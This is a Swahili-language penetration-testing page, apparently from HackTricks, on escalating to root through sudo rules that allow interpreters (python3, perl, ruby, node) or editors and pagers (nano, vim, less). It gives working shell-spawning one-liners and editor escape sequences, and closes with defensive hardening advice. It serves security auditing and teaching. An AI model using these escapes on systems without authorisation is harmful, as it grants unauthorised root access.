# Matumizi Mabaya ya Amri za Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters zinazoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interpreter kama root, ichukulie kama code execution ya moja kwa moja. Interpreters zimeundwa kutekeleza code ya kiholela, kwa hivyo rule inayoruhusu `python3`, `perl`, `ruby`, `lua`, `node`, au binaries zinazofanana kwa kawaida ni sawa na utekelezaji wa amri za root, isipokuwa arguments zimewekewa mipaka na kuthibitishwa kwa umakini.

Mtiririko wa kawaida wa ukaguzi:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Mifano mingine ya interpreter:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Njia kamili ni muhimu. Ikiwa sheria ya sudo inaruhusu `/usr/bin/python3`, tumia njia hiyo kamili wakati wa uthibitishaji:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Vihariri vinavyoruhusiwa na Sudo

Ikiwa `sudo -l` inamruhusu mtumiaji kuendesha interactive editor kama root, ichukulie kama command-execution surface, si ruhusa isiyo na madhara ya kuhariri faili. Editors mara nyingi vinaweza kutekeleza shell commands, kusoma faili zozote, kuandika faili zozote, au kuita external helpers kutoka ndani ya editor.

Mtiririko wa kawaida wa ukaguzi:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Utekelezaji wa amri kwa Nano

Wakati `nano` inaruhusiwa kupitia sudo, utekelezaji wa amri unaweza kufikiwa kutoka kwenye interface ya kihariri:
```text
Ctrl+R
Ctrl+X
```
Kisha toa command kama vile:
```bash
id
/bin/sh
```
Kwenye baadhi ya terminal, interactive shell inaweza kuhitaji standard streams zielekezwe upya:
```bash
reset; /bin/sh 1>&0 2>&0
```
Mfuatano halisi wa vitufe unaweza kutofautiana kulingana na toleo la nano na chaguo za build, lakini suala la usalama ni lilelile: editor inaendeshwa kama root na inaweza kuendesha amri za nje.

### Njia nyingine za kawaida za kutoka kwenye editor

Vim-style editors kwa kawaida hutoa uwezo wa kuendesha amri kupitia `:!`:
```text
:!/bin/sh
```
Pagers kama `less` pia zinaweza kuwezesha utekelezaji wa shell:
```text
!/bin/sh
```
## Maelezo ya ulinzi

- Epuka kutoa interpreters au interactive editors kupitia sudo.
- Pendelea wrappers zisizobadilika, zinazomilikiwa na root, zinazotekeleza administrative action moja maalum.
- Ikiwa interpreter haiwezi kuepukika, zuia script path halisi na uzuie user-controlled arguments, writable imports, `PYTHONPATH`, pamoja na unsafe environment preservation.
- Ikiwa file editing inahitajika, zuia file path halisi na zingatia `sudoedit` ukitumia sudo versions zilizopigwa patch na strict environment handling.
- Kagua `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, na logging, lakini usizichukulie kama sandbox kamili.
